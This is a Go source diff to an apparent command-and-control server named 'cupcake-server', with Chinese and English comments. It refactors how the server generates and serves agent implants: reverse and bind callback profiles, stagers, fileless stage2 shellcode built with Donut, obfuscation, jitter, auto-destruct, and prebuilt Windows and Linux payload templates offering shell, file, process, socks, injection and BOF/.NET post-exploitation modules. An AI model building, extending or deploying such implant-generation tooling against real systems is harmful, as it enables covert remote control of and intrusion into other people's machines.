@@ -3,6 +3,7 @@ package controllers
 import (
 	"cupcake-server/pkg/globals"
 	"cupcake-server/pkg/hub"
+	"cupcake-server/pkg/paths"
 	"cupcake-server/pkg/utils"
 	"cupcake-server/services"
 	"encoding/base64"
@@ -52,7 +53,7 @@ type StagerConfig struct {
 	Host         string // Agent C2 callback host (NOT the panel download host)
 	AutoDestruct bool
 	SleepTime    int
-	Profile      string // reverse_slim|beacon | reverse|standard | forward
+	Profile      string // reverse | forward (direction); cargo always minimal
 	Extra        string // For bat stager: "url64|url32"
 	// Delivery: ""|"disk" (default EXE) | "fileless" (stage2 PIC via Donut)
 	Delivery string
@@ -85,12 +86,13 @@ var upgrader_gen = websocket.Upgrader{
 	CheckOrigin: globals.AdminCheckOrigin,
 }
 
-// Product client types (UI / API "profile" field) — two directions, SAME capability:
+// Product client types (UI / API "profile" field) — connection direction only:
 //
 //	reverse | … → 反向连接（Agent 主动回连）
 //	forward | … → 正向 bind（Agent 监听，面板接入）
 //
-// Both build cargo feature tier **minimal** (shell/fs/proc/pty + module-loader).
+// Cargo feature tier is always **minimal** (sole product aggregate).
+// Legacy names beacon/standard/full map to reverse direction only.
 func normalizeCapabilityProfile(p string) string {
 	switch strings.ToLower(strings.TrimSpace(p)) {
 	case "forward", "bind", "bind-tcp", "正向", "正向客户端":
@@ -104,8 +106,7 @@ func normalizeCapabilityProfile(p string) string {
 	}
 }
 
-// cargoProfile maps product type → cargo feature tier.
-// Forward and reverse both use minimal (identical post-ex surface).
+// cargoProfile always returns the sole product cargo tier.
 func cargoProfile(product string) string {
 	_ = product
 	return "minimal"
@@ -113,7 +114,7 @@ func cargoProfile(product string) string {
 
 // profileBuildHint returns operator-facing notes for logs / errors.
 func profileBuildHint(profile string) string {
-	const caps = "终端/文件/进程内置（~0.8MB）；BOF/.NET 按需模块，不进默认包"
+	const caps = "唯一产品档 minimal：终端/文件/进程/socks 内置；BOF/.NET/desktop/inject 按需 L2"
 	switch normalizeCapabilityProfile(profile) {
 	case "forward":
 		return "正向客户端：Agent 监听 bind 端口，面板主动接入。" + caps
@@ -156,34 +157,13 @@ func profileProductLabel(product string) string {
 }
 
 // resolvePatchTemplate picks a prebuilt template path for patch mode.
-// For profile=minimal, prefers *_minimal artifacts when present; otherwise returns a clear error name.
-func resolvePatchTemplate(osType, arch, protocol, profile string) (string, string) {
+// All templates are cargo **minimal**. `profile` is direction only (reverse/forward) and
+// does not select a capability tier. Legacy `*_minimal` names remain as optional aliases
+// (caller may try them if primary file is missing).
+func resolvePatchTemplate(osType, arch, protocol, _profile string) (string, string) {
 	proto := strings.ToUpper(strings.TrimSpace(protocol))
-	profile = normalizeCapabilityProfile(profile)
 	isWin := strings.EqualFold(osType, "windows")
 	isArm := strings.Contains(strings.ToLower(arch), "arm64")
-
-	// Minimal templates currently exist for TCP (see compile_windows.ps1 / compile_linux.sh)
-	if profile == "minimal" {
-		if isWin && (proto == "TCP") {
-			return "client_template_windows_tcp_minimal.exe", ""
-		}
-		if !isWin && (proto == "TCP") {
-			name := "client_template_linux_tcp_minimal"
-			if isArm {
-				// arm64 minimal may not be prebuilt; keep name for error guidance
-				name += "_arm64"
-			}
-			return name, ""
-		}
-		// No dedicated minimal template for this combo
-		return "", fmt.Sprintf(
-			"profile=minimal 暂无对应补丁模板 (os=%s protocol=%s)。请改用「源码构建」或先 Rebuild 标准模板后使用 standard",
-			osType, protocol,
-		)
-	}
-
-	// standard / full share the same prebuilt templates (full is source-build only for stealth-adv)
 	archL := strings.ToLower(arch)
 	isX86 := strings.Contains(archL, "i386") ||
 		(strings.Contains(archL, "x86") && !strings.Contains(archL, "x64") && !strings.Contains(archL, "amd64"))
@@ -226,6 +206,23 @@ func resolvePatchTemplate(osType, arch, protocol, profile string) (string, strin
 	return name, ""
 }
 
+// resolvePatchTemplateAlias returns a legacy *_minimal filename for the same protocol (if any).
+func resolvePatchTemplateAlias(osType, arch, protocol string) string {
+	proto := strings.ToUpper(strings.TrimSpace(protocol))
+	isWin := strings.EqualFold(osType, "windows")
+	isArm := strings.Contains(strings.ToLower(arch), "arm64")
+	if isWin && proto == "TCP" {
+		return "client_template_windows_tcp_minimal.exe"
+	}
+	if !isWin && proto == "TCP" {
+		if isArm {
+			return "client_template_linux_tcp_minimal_arm64"
+		}
+		return "client_template_linux_tcp_minimal"
+	}
+	return ""
+}
+
 func HandleGenerate(c *gin.Context) {
 	var req struct {
 		OS              string `json:"os"`
@@ -240,7 +237,7 @@ func HandleGenerate(c *gin.Context) {
 		EncryptionSalt  string `json:"encryption_salt"`
 		ObfuscationMode string `json:"obfuscation_mode"`
 		Jitter          int    `json:"jitter"`
-		Profile         string `json:"profile"` // reverse_slim|beacon | reverse|standard | forward
+		Profile         string `json:"profile"` // reverse | forward (direction only; cargo always minimal)
 	}
 
 	if err := c.ShouldBindJSON(&req); err != nil {
@@ -270,14 +267,14 @@ func HandleGenerate(c *gin.Context) {
 		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error(), "hint": profileBuildHint(product)})
 		return
 	}
-	// Cargo feature tier (minimal | standard). reverse→minimal; forward→standard+bind.
+	// Cargo feature tier always minimal; reverse/forward only changes protocol direction.
 	profile := cargoProfile(product)
 
 	// --- [NEW] Method Dispatcher ---
 	
 	// Mode A: Binary Patch (Synchronous, fast)
 	if req.Method == "patch" {
-		// reverse uses minimal cargo for source builds; patch templates may be larger (standard-era)
+		// reverse uses minimal cargo; patch uses prebuilt minimal templates
 		templateName, hint := resolvePatchTemplate(req.OS, req.Arch, ln.Protocol, profile)
 		if templateName == "" {
 			c.JSON(http.StatusBadRequest, gin.H{"error": hint})
@@ -519,7 +516,7 @@ func HandleGetStager(c *gin.Context) {
 		c.JSON(400, gin.H{"error": err.Error(), "hint": profileBuildHint(product)})
 		return
 	}
-	// 一键上线走补丁模板（反向可用 standard/minimal 模板；能力以补丁包为准）
+	// 一键上线走补丁模板（均为 minimal 产品档模板）
 	profile := cargoProfile(product)
 
 	// 下载地址必须指向 Web 控制台（面板），携带端口；与 C2 回连 host 分离
@@ -870,10 +867,9 @@ func HandleServeRawPayload(c *gin.Context) {
 	ln := lnVal.(*globals.Listener)
 
 	product := normalizeCapabilityProfile(conf.Profile)
-	profile := cargoProfile(product)
-	// stager uses patch templates; cargo tier "minimal" falls back to standard templates in resolvePatchTemplate
+	profile := cargoProfile(product) // always "minimal"
+	_ = product
 
-	// Prefer profile-aware template selection
 	archHint := conf.Arch
 	if targetOS == "windows" {
 		if conf.Arch == "x86" || conf.Arch == "i386" {
@@ -891,9 +887,6 @@ func HandleServeRawPayload(c *gin.Context) {
 
 	templateName, hint := resolvePatchTemplate(targetOS, archHint, ln.Protocol, profile)
 	if templateName == "" {
-		templateName, _ = resolvePatchTemplate(targetOS, archHint, ln.Protocol, "standard")
-	}
-	if templateName == "" {
 		c.Data(500, "text/plain", []byte("no template mapping: "+hint))
 		return
 	}
@@ -909,12 +902,11 @@ func HandleServeRawPayload(c *gin.Context) {
 	templatePath := filepath.Join("assets", templateName)
 	raw, err := os.ReadFile(templatePath)
 	if err != nil {
-		// Fallback: try standard template name
-		stdName, _ := resolvePatchTemplate(targetOS, archHint, ln.Protocol, "standard")
-		if stdName != "" && stdName != templateName {
-			if raw2, err2 := os.ReadFile(filepath.Join("assets", stdName)); err2 == nil {
+		// Fallback: legacy *_minimal alias (same cargo minimal binary)
+		if alias := resolvePatchTemplateAlias(targetOS, archHint, ln.Protocol); alias != "" && alias != templateName {
+			if raw2, err2 := os.ReadFile(filepath.Join("assets", alias)); err2 == nil {
 				raw = raw2
-				templateName = stdName
+				templateName = alias
 				err = nil
 			}
 		}
@@ -992,18 +984,16 @@ func buildAndCacheFilelessStage2(
 	archHint := arch
 	templateName, _ := resolvePatchTemplate(targetOS, archHint, ln.Protocol, profile)
 	if templateName == "" {
-		templateName, _ = resolvePatchTemplate(targetOS, archHint, ln.Protocol, "minimal")
-	}
-	if templateName == "" {
 		return "", "", 0, fmt.Errorf("no template for fileless profile")
 	}
 	templatePath := filepath.Join("assets", templateName)
 	raw, rerr := os.ReadFile(templatePath)
 	if rerr != nil || len(raw) == 0 {
-		// Fallback standard
-		stdName, _ := resolvePatchTemplate(targetOS, archHint, ln.Protocol, "standard")
-		if stdName != "" {
-			raw, rerr = os.ReadFile(filepath.Join("assets", stdName))
+		if alias := resolvePatchTemplateAlias(targetOS, archHint, ln.Protocol); alias != "" {
+			raw, rerr = os.ReadFile(filepath.Join("assets", alias))
+			if rerr == nil {
+				templateName = alias
+			}
 		}
 	}
 	if rerr != nil || len(raw) == 0 {
@@ -1132,12 +1122,9 @@ func HandleServeProtectedPayload(c *gin.Context) {
 		return
 	}
 
-	// 限定到指定目录
-	fullPath := filepath.Join("storage", "payloads", filename)
-	fullPath = filepath.Clean(fullPath)
-
-	// 二次确认路径在允许范围内
-	baseDir, _ := filepath.Abs(filepath.Join("storage", "payloads"))
+	// 限定到 data-dir payloads
+	baseDir, _ := filepath.Abs(paths.Join("payloads"))
+	fullPath := filepath.Clean(filepath.Join(baseDir, filename))
 	absPath, _ := filepath.Abs(fullPath)
 	if !strings.HasPrefix(absPath, baseDir) {
 		c.JSON(http.StatusForbidden, gin.H{"error": "Access denied"})
